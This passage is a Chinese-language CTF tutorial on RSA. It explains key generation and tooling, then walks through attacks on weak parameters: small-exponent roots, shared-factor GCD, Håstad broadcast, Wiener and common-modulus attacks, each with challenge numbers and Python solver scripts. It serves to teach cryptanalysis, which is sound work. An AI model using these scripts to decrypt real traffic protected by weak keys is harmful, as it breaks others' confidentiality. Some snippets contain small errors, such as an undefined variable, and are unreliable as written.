    <content type="text"><![CDATA[RSA介绍 RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德 · 李维斯特（Ron Rivest）、阿迪 · 萨莫尔（Adi Shamir）和伦纳德 · 阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。 RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。 基本原理 公钥与私钥的产生 随机选择两个不同大质数 \(p\) 和 \(q\)，计算\[N=p×q\] 根据欧拉函数，求得 \(\varphi (N)=\varphi (p)\varphi (q)=(p−1)(q−1)\) 1 选择一个小于\(\varphi (N)\) 的整数 \(e\)，使 \(e\) 和 \(\varphi (N)\)互质。并求得 \(e\) 关于$ (N) $的模反元素，命名为 \(d\)，有 \(ed \equiv 1\ (mod\ \varphi(N))\)，即\(ed-1\)能被\(\varphi (N)\)整除。2 将 \(p\) 和 \(q\) 的记录销毁 对明文\(m\)进行加密：\(c = pow(m, e, N)\),可以得到密文\(c\)。 对密文\(c\)进行解密：\(m = pow(c, d, N)\),可以得到明文\(m\)。 使用到的字母： \(p\) 和 \(q\)：两个大的质数，是另一个参数N的的两个因子。 \(N\)：大整数，可以称之为模数 \(e\) 和 \(d\)：encryption key (public key) (又称加密指数)和decryption key (private key) e对于(n)的模反元素 \(c\) 和 \(m\)：密文和明文 \((N, e)\)：公钥 \((N, d)\)：私钥 \(pow(x,y,z)\)：计算\(x^y\ mod\ z\) 工具 RSAtool 安装 123git clone https://github.com/ius/rsatool.gitcd rsatoolpython rsatool.py -h 生成私钥 1python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321 openssl 查看公钥文件 1openssl rsa -pubin -in pubkey.pem -text -modulus 解密 1openssl rsautl -decrypt -inkey private.pem -in flag.enc -out flag 更加具体的细节请参考 openssl --help。 分解整数工具 网站分解，factor.db 命令行分解，factordb-pycli，借用 factordb 数据库。 yafu python库 primefac 整数分解库，包含了很多整数分解的算法。 gmpy gmpy.root(a, b)，返回一个元组 (x, y)，其中 x 为 a 开 b 次方的值，y 是判断 x 是否为整数的布尔型变量 gmpy2 安装时，可能会需要自己另行安装 mfpr 与 mpc 库。 1234567891011import gmpy2gmpy2.gcd() # 欧几里得算法，用于计算两个整数a,b的最大公约数。gmpy2.gcdex() # 扩展欧几里得算法p = gmpy2.mpz(258631601377848992211685134376492365269) # 初始化一个大整数q = gmpy2.mpz(286924040788547268861394901519826758027)e = gmpy2.mpz(65537) n = p*q # 74207624142945242263057035287110983967646020057307828709587969646701361764263m = gmpy2.mpz(0x666c61677b746573747d) # 明文，flag&#123;test&#125;c = gmpy2.powmod(m, e, n) # 加密，密文：29766627188948515299752891165088038848853967387353164719200436253350322889530d = gmpy2.invert(e, (p - 1) * (q - 1)) # 计算e相对于\varphi (n)的模反元素flag = hex(gmpy2.powmod(c, d, n))[2:].decode("hex") # 得到flag，flag&#123;test&#125; pycrypto Ubuntu 安装 1sudo pip install pycrypto 使用 12345678910111213141516import gmpyfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5msg = 'crypto here'p = getPrime(128)q = getPrime(128)n = p*qe = getPrime(64)pubkey = RSA.construct((long(n), long(e)))privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))key = PKCS1_v1_5.new(pubkey)enc = key.encrypt(msg).encode('base64')key = PKCS1_v1_5.new(privatekey)msg = key.decrypt(enc.decode('base64'), e) Windows 安装 1pip install pycryptodome 使用 用法同pycrypto 1rsa =RSA.construct((n,e,d,p,q)) 题目类型 模数分解 这类题目就是给个\(N\)、\(e\)、\(c\)什么的，算出其他需要的值 例题 rsarsa 123456p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message \(p\)，\(q\)都给了，直接用gmpy2.invert(e,(p-1)*(q-1))算出\(d\)，再用gmpy2.powmod(c,d,n)就可以得到flag了 解密脚本 1234567891011import gmpy2p=gmpy2.mpz(9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483)q=gmpy2.mpz(11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407)n=p*qe=gmpy2.mpz(65537)d=gmpy2.invert(e,(p-1)*(q-1))c=gmpy2.mpz(83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034) flag=gmpy2.powmod(c,d,n) 低加密质数攻击 在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。 e=3时的小明文攻击 当\(e=3\)时，如果明文过小，导致明文的三次方仍然小于\(n\)，那么通过直接对密文三次开方，即可得到明文。 即： \[c\equiv m^e\ mod\ n\] 如果e=3，且$ m^e&lt;{n} $，那么： \[ c= m^e,\ e=3\] \[ m = \sqrt[3]{c}\] 如果明文的三次方比n大，但是不是足够大，那么设k，有： \[ c= m^e+kn\] 爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。 例题 123n: 0x81cfc71c44c83faf3c5242fa81ae2e533fc945f3bef30bc13323ea4a55b3debc11301c6a9ecb8f7ef92fa169b157435af728a145497f2cdf75b3007b9732da4c47d67683f09ae1edc8f698f5ec7549593d9f1d06adafae4ad09514928bf0367a2719f7c171580318690dafc6a3d5385b3516b769f529c0a055ce25e68bc21395Le: 0x01c: 0x6867616d657b7273615f31735f737469316c5f653473795f6e6f77217dL 因为\(e=1\)，根据上面的结果，\(c=m^1=m\)，直接将\(c\)解码即可得到flag 多个n有公约数分解 如果在两次公钥的加密过程中使用的\(n_1\) 和\(n_2\)具有相同的素因子，那么可以利用欧几里得算法直接将\(n_1\)和\(n_2\)分解。 利用欧几里得算法解出最大公约数\(p\) 12345678def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a 例题 1234567n is 28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181e is 65537c is 14200655400630956617529154837540349350095534430543196299987252783320359338882400858000649938298574946882176873795065987640380185922571487987903069796872680567596754211592988768630729844485795253975027297563832927176988502771266530781452168489731952873297707254669904609865565861351429459102567318447934677565870915603816516557032164955329497823771897899211076176905132170360842951444390670253036307048815943908305457043184642918674003085039564350070641592716116089015861491205237748561298604957423077954850396167621218521884114394431799317165818964438359695744604198246716410783223931430682808151056020475306791729591n is 29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613e is 65537c is 4578343924026570978472440931890325318245466288503599188533732998304051832656861172828218449138067382663459418589454854723253403947485557649615240187148291946554256687236506349553390057789720132702311963022032912389266835192465297150080916409872411988524410949952643478505491642457481045586019802683635095575472601541635397816830552539347027587330022646372943452066068029168471475125499435879399193076604330172042202401974524486727842888375820659903161039255979785711025431762267505041403586092799995451754527655054098031095440553010856162282818464431911828926227552966047893177859591679867661412947560702301353393344 1234567891011121314151617def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return an1 = 28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181n2 = 29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613p = gcd(n1,n2)print p,"\n\n",n1 // p 解出\(p\)，\(q\)，egcd取d，pow求m。 低加密指数广播攻击 如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： \[ c_1\equiv\ m^e\ mod\ n_1\] \[ c_2\equiv\ m^e\ mod\ n_2\] \[ c_3\equiv\ m^e\ mod\ n_3\] 对上述等式运用中国剩余定理，在\(e=3\)时，可以得到： \[ c_x \equiv m^3\ mod\ n_1n_2n_3\] 通过对\(c_x\)进行三次开方可以求得明文。 例题 123456789101112131415161718192021222324252627282930313233343536373839n is 17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149e is 10c is 4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416n is 21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577e is 10c is 4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689n is 30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761e is 10c is 12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923n is 18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277e is 10c is 4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831n is 27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129e is 10c is 18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506n is 22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793e is 10c is 19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909n is 20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501e is 10c is 2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466n is 21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273e is 10c is 9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926n is 23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821e is 10c is 17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553n is 27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257e is 10c is 8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316 解密脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import gmpydef my_parse_number(number): string = "%x" % number erg = [] while string != '': erg = erg + [chr(int(string[:2], 16))] string = string[2:] return ''.join(erg)def e_gcd(a, b): x,y = 0, 1 lastx, lasty = 1, 0 while b: a, (q, b) = b, divmod(a,b) x, lastx = lastx-q*x, x y, lasty = lasty-q*y, y return (lastx, lasty, a)def chinese_remainder_theorem(items): N = 1 for a, n in items: N *= n result = 0 for a, n in items: m = N/n r, s, d = e_gcd(n, m) if d != 1: raise "Input not pairwise co-prime" result += a*s*m return result % N, Ne=10n=[17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149,21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577,30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761,18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277,27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129,22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793,20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501,21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273,23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821,27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257]c=[4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416,4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689,12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923,4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831,18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506,19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909,2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466,9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926,17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553,8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316]data=[]for i in range(len(c): data += [(c[i],n[i])]x, n = chinese_remainder_theorem(data)realnum = gmpy.mpz(x).root(e)[0].digits()print my_parse_number(int(realnum))#When e are small and same,it can be Hastad's broadcast attack.Maybe we won't have topic aboout RSA,but I wish you can explore it Non-stop.hctf&#123;Hastad's_broadcast_attack_is_interesting&#125; 低解密指数攻击 与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。Wiener表示如果满足： \[ d&lt;\frac{1}{3}n^\frac{1}{4} \] 那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足： \[ q&lt;p&lt;2q \] 如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。 rsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。 识别 非常简单，e看起来很大就行了。 例题 直接github用工具就行。https://github.com/pablocelayes/rsa-wiener-attack 这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上： 12import syssys.setrecursionlimit(10000000) 提供enc和pem文件 例题 RSA 使用openssl得到public.pem的n和e 123openssl rsa -text -modulus -pubin -in public.pemExponent: 65537 (0x10001)Modulus=A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7 利用gmpy2算出其他值，并使用pycryptodome模块导出private.pem 123456789101112from Crypto.PublicKey import RSAimport gmpy2n = gmpy2.mpz(74207624142945242263057035287110983967646020057307828709587969646701361764263)p = gmpy2.mpz(258631601377848992211685134376492365269)q = gmpy2.mpz(286924040788547268861394901519826758027)e = gmpy2.mpz(65537)d = gmpy2.invert(e, (p - 1) * (q - 1))with open("private.pem", "wb") as file: privateKey = RSA.construct((int(n), int(e), int(d), int(p), int(q))) file.write(privateKey.exportKey()) 最后使用openssl解密flag.enc 1openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec 共模攻击 如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。 即： \[ c_1 \equiv m^{e_1}\ mod\ n \] \[ c_2 \equiv m^{e_2}\ mod\ n \] 此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。 过程如下，首先两个加密指数互质，则： \[ (e_1,e_2)=1 \] 即存在\(s_1,s_2\)使得： \[ s_1e_1+s_2e_2=1 \] 又因为： \[ c_1 \equiv m^{e_1}\ mod\ n \] \[ c_2 \equiv m^{e_2}\ mod\ n \] 通过代入化简可以得出： \[ 